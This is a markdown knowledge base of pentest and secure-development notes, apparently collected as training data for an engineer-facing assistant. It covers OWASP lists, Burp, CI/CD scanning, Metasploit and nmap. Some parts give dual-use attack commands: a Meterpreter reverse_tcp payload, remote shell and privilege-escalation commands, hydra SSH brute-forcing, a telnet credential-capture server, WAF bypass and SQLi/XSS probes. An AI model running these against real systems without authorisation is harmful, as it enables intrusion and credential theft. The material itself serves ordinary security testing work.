# Web Research — Practical Knowledge Base for Digital Twin
## Collected: May 2026

All findings from web searches. Convert these into training data format for the twin.
Format: short engineer questions (median ~41 chars) → AI responses with practical details.

---

## 1. PENETRATION TESTING TOOLS (AI-Powered)

### Apex (pensarai)
```bash
# Install
curl -fsSL https://pensarai.com/install.sh | bash
# Basic pentest
pensar pentest --target https://example.com
# With extended thinking
pensar pentest --target https://example.com --extended-thinking --task-driven
# Targeted
pensar targeted-pentest --target https://example.com --objective "Test authentication bypass"
# Whitebox (with source code access)
pensar pentest --target https://example.com --cwd ./my-app
```
- Uses autonomous agents for blackbox/whitebox testing
- CI/CD integration: headless CLI
- Needs API key (Anthropic/OpenAI)
- Kali Linux container available for full toolchain
- W&B Weave tracing for debugging agent decisions

### GhostScan v3
```bash
# Install
pip install ghostscan  # or however it's installed
# Stealth (passive recon only)
ghostscan -t TARGET --mode stealth
# Standard + report
ghostscan -t TARGET --mode standard --all --report pdf
# Aggressive
ghostscan -t TARGET --mode aggressive
# WAF bypass
ghostscan -t target.com --web --waf-bypass --waf-profile cloudflare
```
- 53 integrated tools (nmap, nuclei, sqlmap, hydra, john, etc.)
- Correlation engine: Login + SQLi = CRITICAL automatically
- Scoring: impact × 0.6 + confidence × 0.4
- Signal-to-noise: 10 findings ranked by severity vs typical 300 findings dump
- Plugin system: drop .py in plugins/
- Adaptive workflow: suggests next commands based on findings
- Integrated tools: nmap, masscan, dnsrecon, amass, sublist3r, nikto, whatweb, gobuster, ffuf, nuclei, sqlmap, xsstrike, hydra, john, hashcat, enum4linux, snmpwalk

### AIPTX
```bash
pip install aiptx
pip install aiptx[modern]  # for SPA/WebSocket testing
pip install aiptx[full]    # complete install
# Basic scan
aiptx scan example.com
# Quick scan (skip enterprise scanners)
aiptx scan example.com --quick
# With AI assistance
aiptx scan example.com --ai
# SAST on code (Static Analysis Security Testing)
aiptx scan ./my-project --sast
# SARIF for CI/CD
aiptx scan example.com --format sarif --output results.sarif --fail-on-severity high
```
- SAST: 90+ security rules (Python, JS, Java, Go)
- DAST: WebSocket, SPA, GraphQL scanner
- Business Logic: 29 patterns (race conditions, IDOR, price manipulation)
- GitHub Action available

---

## 2. OWASP Top 10:2025

1. **A01 Broken Access Control** (3.73% of apps) — 40 CWEs
2. **A02 Security Misconfiguration**
3. **A03 Software Supply Chain Failures** — NEW, elevated from previous years due to log4j/event-stream type attacks
4. **A04 Cryptographic Failures**
5. **A05 Injection** (SQL, NoSQL, OS command)
6. **A06 Insecure Design**
7. **A07 Authentication Failures**
8. **A08 Software or Data Integrity Failures**
9. **A09 Security Logging and Alerting Failures**
10. **A10 Mishandling of Exceptional Conditions** — NEW

Source: 175,000 application-testing records from OWASP 2025 dataset.

---

## 3. OWASP API Security Top 10 (2023/2026)

1. **API1: Broken Object Level Authorization (BOLA)** — #1 since 2019
2. **API2: Broken Authentication**
3. **API3: Broken Object Property Level Authorization** (Mass Assignment + Excessive Data Exposure merged)
4. **API4: Unrestricted Resource Consumption** (rate limiting)
5. **API5: Broken Function Level Authorization**
6. **API6: Unrestricted Access to Sensitive Business Flows** — NEW 2023
7. **API7: Server Side Request Forgery (SSRF)** — NEW 2023
8. **API8: Security Misconfiguration**
9. **API9: Improper Inventory Management**
10. **API10: Unsafe Consumption of APIs** — NEW 2023

Key insight: Most API breaches involve VALID credentials and correct HTTP methods — signature-based alerts don't catch them.

### BOLA Testing Method
1. Create user account A, create a resource, note its ID
2. Create user account B
3. Try to access resource A's ID from account B
4. If accessible → BOLA vulnerability
5. Apply to EVERY endpoint that accepts an object ID

### API Security Testing Commands
```bash
# OWASP ZAP API scan
docker run -t zaproxy/zap-stable zap-api-scan.py \
  -t https://api.example.com/openapi.json \
  -f openapi \
  -r api-scan-report.html

# Authenticated scan
docker run -t zaproxy/zap-stable zap-api-scan.py \
  -t https://api.example.com/openapi.json \
  -f openapi \
  -n context.yaml \
  -U testuser \
  -r report.html
```

---

## 4. BURP SUITE PRACTICAL METHODOLOGY

### Setup
- Community Edition (free) or Professional ($449/year)
- Proxy listener: 127.0.0.1:8080
- Install CA certificate for HTTPS inspection
- Built-in Chromium browser (pre-configured with proxy)

### Workflow (The Correct Order)
1. **Passive Recon**: Browse the target with Intercept OFF → build Site Map
2. **App Mapping**: Document every page, form, function, API endpoint
3. **Attack Surface**: Use ffuf/gobuster for hidden endpoints
4. **Manual Testing**: Repeater for one-at-a-time modification
5. **Automated**: Intruder for payload testing
6. **Report**: Document with evidence

### Repeater vs Intruder
| Tool | Purpose | When to Use |
|------|---------|-------------|
| Repeater | Manual, one request at a time | Understanding behavior, testing edge cases |
| Intruder | Automated, many payloads | Brute force, fuzzing, parameter testing |

### Key Testing Areas
- **SQL Injection**: `'`, `"`, `1 OR 1=1`, JSON injection
- **XSS**: `<script>alert(1)</script>`, check context (HTML/JS/CSS/URL)
- **Auth**: Rate limiting, JWT `alg:none`, account enumeration, session entropy
- **IDOR**: Cross-user resource access testing
- **Sequencer**: Token randomness analysis (200+ token sample)
- **Extensions**: JWT Editor, Autorize, Logger++ (from BApp Store)

### Burp Professional Features (worth it for serious work)
- Automated scanning (crawl + audit)
- CI/CD integration (Burp Enterprise)
- BChecks (custom scan rules)
- OpenAPI 3.1/3.2 scanning support
- OAuth 2.0 authentication handling
- OWASP Top 10:2025 reporting templates

---

## 5. SECURE CODE REVIEW

### OWASP Secure Coding Checklist (14 Categories)
1. Input Validation
2. Output Encoding
3. Authentication and Password Management
4. Session Management
5. Access Control
6. Cryptographic Practices
7. Error Handling and Logging
8. Data Protection
9. Communication Security
10. System Configuration
11. Database Security
12. File Management
13. Memory Management
14. General Coding Practices

### Framework-Specific Checks
| Framework | Key Security Checks |
|-----------|-------------------|
| React/Next.js | XSS via unsafe HTML, SSRF in server-side fetch, exposed API routes |
| Express/Node | Missing helmet, no rate limiting, prototype pollution, regex DoS |
| Django | Raw SQL, CSRF exemptions, DEBUG=True, SECRET_KEY exposure |
| Flask | Jinja2 autoescape disabled, unsafe session serialization |
| Spring | SpEL injection, actuator exposure, mass assignment |
| Rails | Mass assignment, render user input, SQL fragments |
| Go net/http | Missing timeouts, TOCTOU, integer overflow |

### Code Review on PR
Diff-specific analysis:
- Focus on changed lines + immediate context
- Check security controls in unchanged code are preserved
- New endpoints must have auth matching existing patterns
- New dependencies → check for known vulns (SCA)
- Removed security controls (deleted validation, removed auth checks)

Fix rate: Code review catches 60-80% of security bugs before production.

### Crypto Rules
- ALGORITHMS TO AVOID: DES, 3DES, RC4, MD5, SHA-1
- APPROVED: AES-256, RSA ≥ 2048 bits, ECC P-256/P-384/P-521
- Passwords: bcrypt, Argon2, scrypt
- Never: hardcoded keys, ECB mode, custom crypto

### SAST Tools
```bash
# Semgrep (multi-language, fast, CI-friendly)
pip install semgrep
semgrep --config=p/security-audit --error .
semgrep --config=p/owasp-top-ten --config=p/secrets --sarif --output results.sarif .

# Language-specific
# Python: pip install bandit && bandit -r .
# JS: npm audit (SCA) + ESLint security plugin
# Go: gosec
# Multi: CodeQL (free for open source), SonarQube
```

### ASVS Levels
| Level | Scope | For |
|-------|-------|-----|
| L1 | Basic automated testing | All applications |
| L2 | Standard + manual review | Most apps with sensitive data |
| L3 | Full + threat modeling | Finance, healthcare, critical infra |

ASVS L2 maps to PCI DSS, GDPR Article 25, ISO 27001.

---

## 6. CI/CD SECURITY PIPELINE

### The Complete Flow
```
Push → Secrets Detection (Gitleaks) 
     → SAST (Semgrep) 
     → SCA (Trivy dependencies) 
     → Build 
     → Container Scan (Trivy image) 
     → IaC Scan (Checkov) 
     → Deploy Staging 
     → DAST (OWASP ZAP) 
     → Production
```

### GitHub Actions Pipeline
```yaml
# SAST
- name: Semgrep
  uses: returntocorp/semgrep-action@v1
  with:
    config: p/security-audit,p/secrets,p/owasp-top-ten

# SCA - Trivy
- name: Trivy
  uses: aquasecurity/trivy-action@master
  with:
    scan-type: 'fs'
    scan-ref: '.'
    severity: 'CRITICAL,HIGH'
    exit-code: '1'
    format: 'sarif'
    output: 'trivy-fs.sarif'

# Container
- name: Container Scan
  uses: aquasecurity/trivy-action@master
  with:
    scan-type: 'image'
    image-ref: 'my-image:tag'
    severity: 'CRITICAL,HIGH'
    exit-code: '1'

# DAST - ZAP
- name: ZAP Scan
  run: |
    docker run -t zaproxy/zap-stable zap-baseline.py \
      -t https://staging.example.com \
      -r zap-report.html
```

### Security Gates
| Severity | Action |
|----------|--------|
| Critical CVE in dep | Block PR |
| Hardcoded secret | Block + alert security team |
| Critical SAST (injection, XXE) | Block |
| High SAST | Block |
| Medium SAST | Warning |
| IaC critical misconfig | Block |
| License violation | Block |

Start conservative: block only CRITICAL first, add HIGH gradually.
Medium gates from day one = alert fatigue.

### Quick Command Reference
```bash
# Semgrep
semgrep --config=p/security-audit .

# Trivy filesystem
trivy fs --severity CRITICAL,HIGH --exit-code 1 .

# Trivy container image
trivy image --severity CRITICAL my-image:latest

# Gitleaks (secrets)
gitleaks detect --verbose

# Checkov (IaC)
checkov -d . --framework terraform,kubernetes --check CRITICAL,HIGH

# ZAP baseline (passive only)
docker run -t zaproxy/zap-stable zap-baseline.py -t https://target.com -r report.html

# Cosign (image signing)
cosign sign --key cosign.key my-image:tag
```

---

## 7. RAG vs FINE-TUNING vs AGENTS

### Decision Framework

| Layer | Problem | Solution |
|-------|---------|----------|
| Knowledge | Dynamic data, citations | RAG |
| Behavior | Tone, format, domain reasoning | Fine-Tuning |
| Workflow | Multi-step, tool-dependent | Agents |

### When to Use What
- **Start with Prompt Engineering** → if not enough, add...
- **RAG**: Knowledge changes often, needs citations, private docs, < 500ms latency OK
- **Fine-Tuning**: Consistent brand voice, specific output format, domain reasoning, high volume (>200K req/month), stable info
- **Agents**: Multi-step tasks, API calls, decision chains, need audit trail
- **Hybrid (most production)**: Fine-tune for behavior + RAG for knowledge = best of both

### RAG Pipeline (4 Components)
1. Chunking: 300-500 tokens, recursive/semantic splitting
2. Embedding: text-embedding-3-small (cost) / 3-large (quality)
3. Vector Store: Chroma (prototype), Pinecone/pgvector (production)
4. Generation: Top-3-5 chunks + LLM with constrained prompt

### RAG Tips
- Hybrid search (BM25 + vector) beats pure vector
- Metadata filtering before vector search = +40% accuracy
- Reranker: retrieve 20, rerank 3 = much better precision
- Query rewriting: fast LLM rewrites user query to dense search string = +25-35% recall
- Semantic caching (RedisVL) = -60% token costs
- Evaluation: RAGAS framework (faithfulness, relevance)

### Agent Architecture
- ReAct pattern: Reason → Act → Observe → Repeat
- Multi-agent: specialized agents (research, code, review) with orchestrator
- DeepMind: multi-agent = 67% faster on 5+ tool calls
- SAFETY: Guardrails (NeMo/LlamaGuard), audit logging, fail gracefully

### Cost Comparison
| Approach | Setup Cost | Per-Query | Update Cost |
|----------|-----------|-----------|-------------|
| RAG | Low-Medium | Medium (+retrieval) | Low (update index) |
| Fine-Tuning (LoRA) | Medium (~$25) | Low | High (retrain) |
| Agents | Medium-High | Medium-High | Medium |
| Hybrid | High | Low at scale | Medium |

Fine-tuned small model (Llama 3.3 8B) = 70-90% cheaper than frontier API at 200K+ req/month.

---

## 8. METASPLOIT PRACTICAL

### Installation (Kali Linux has it built-in)
```bash
# On other systems
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
```

### Key Commands
```bash
msfconsole
# Search for exploits
search type:exploit name:ftp
search cve:2021-41773
search type:auxiliary name:scanner

# Use a module
use exploit/path/to/module

# Set options
show options
set RHOSTS target_ip
set RPORT 21
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST your_ip

# Execute
exploit
# or
run
```

### Meterpreter Commands
```bash
sysinfo        # System info
ipconfig       # Network config
getuid         # Current user
getsystem      # Privilege escalation attempt
download /remote/path /local/path
upload /local/path /remote/path
shell          # System shell
background     # Background session (don't disconnect!)
sessions -l    # List sessions
sessions -i 1  # Interact with session 1
```

### Auxiliary Modules for Recon
```bash
use auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/ssh/ssh_version
use auxiliary/scanner/http/http_version
```

### SSH Pentesting
```bash
# Banner grab
nmap --script banner -p22 target
# Brute force
hydra -L users.txt -P pass.txt target ssh -f
# Single command
nxc ssh target -u user -p pass -x whoami
# Key-based (needs chmod 600)
ssh -i private_key user@target
```

### Telnet Pentesting
```bash
# Connect
telnet target_ip
# Banner
nmap --script banner -p23 target
# Fake telnet server for credential capture
msf> use auxiliary/server/capture/telnet
# Brute force
msf> use auxiliary/scanner/telnet/telnet_login
```
WARNING: Telnet is PLAINTEXT — everything is visible. Replace with SSH immediately.

---

## 9. NMAP ADVANCED

### Scan Types
| Flag | Type | Description |
|------|------|-------------|
| `-sS` | TCP SYN Stealth | Half-open, fast, default |
| `-sT` | TCP Connect | Full connection, logged |
| `-sU` | UDP Scan | Slow but critical (DNS, SNMP) |
| `-sA` | TCP ACK | Firewall detection |
| `-sF` | TCP FIN | Bypass firewalls |
| `-sX` | Xmas Scan | FIN+URG+PSH |
| `-sN` | Null Scan | No flags |
| `-sO` | IP Protocol Scan | Which protocols are supported |

### Practical Commands
```bash
# Quick scan (top 100 ports)
nmap -F target
# Full port range
nmap -p- target
# Specific ports
nmap -p 22,80,443,8080 target
# Service + version + OS + scripts
nmap -sV -sC -O -A target
# Vulnerability scripts
nmap --script vuln target
# All ports + aggressive
nmap -p- -sV -sC -O -A target
# Export
nmap -oN output.txt -oX output.xml target
```

### Key NSE Scripts
```bash
nmap --script-updatedb   # Update script database
nmap --script vuln       # Known vulnerabilities
nmap --script http-enum   # Web directories
nmap --script smb-enum-shares
nmap --script ssl-heartbleed
nmap --script dns-zone-transfer
nmap --script banner -p21,22,80,443 target
```

### Masscan vs Nmap
| Aspect | Masscan | Nmap |
|--------|---------|------|
| Speed | Can scan entire internet in 6 min | Slower, more detailed |
| Depth | Port open/closed only | Service detection, OS, scripts |
| Use case | Initial discovery | Deep assessment |
| Syntax | `masscan 192.168.1.0/24 -p1-65535 --rate=1000` | `nmap -sV -sC -A 192.168.1.0/24` |

### RustScan
Alternative: fast + pipes to Nmap automatically.
```bash
rustscan -a target -- -sV -sC
```

---

## 10. WEB APPLICATION PENTESTING METHODOLOGY (12 Phases)

1. **Pre-Engagement & Scoping** — Authorization, scope, rules of engagement
2. **Reconnaissance (Passive)** — OSINT, subdomains, tech stack, JS analysis, leaked creds
3. **App Mapping** — Browse all features, build attack surface inventory
4. **Authentication Testing** — Rate limits, MFA bypass, JWT, session management
5. **Authorization Testing** — IDOR, privilege escalation, role switching
6. **Input Validation** — SQLi, XSS, command injection, SSRF
7. **Business Logic** — Workflow abuse, race conditions, price manipulation
8. **API Testing** — GraphQL, REST, gRPC, BOLA
9. **Client-Side** — DOM XSS, CSP, client-side storage
10. **Infrastructure/Cloud** — Misconfigurations, exposed services
11. **Exploitation** — Confirm findings, demonstrate impact
12. **Reporting** — Executive summary + technical detail + remediation

### Recon Tools
```bash
# Subdomain discovery
subfinder -d target.com
amass enum -d target.com
# HTTP probing
httpx -l subdomains.txt
# URLs from archives
gau target.com
katana -u target.com
# Parameter discovery
arjun -u https://target.com/endpoint
# Directory brute force
ffuf -u https://target.com/FUZZ -w common.txt -fc 404
gobuster dir -u https://target.com -w common.txt
```
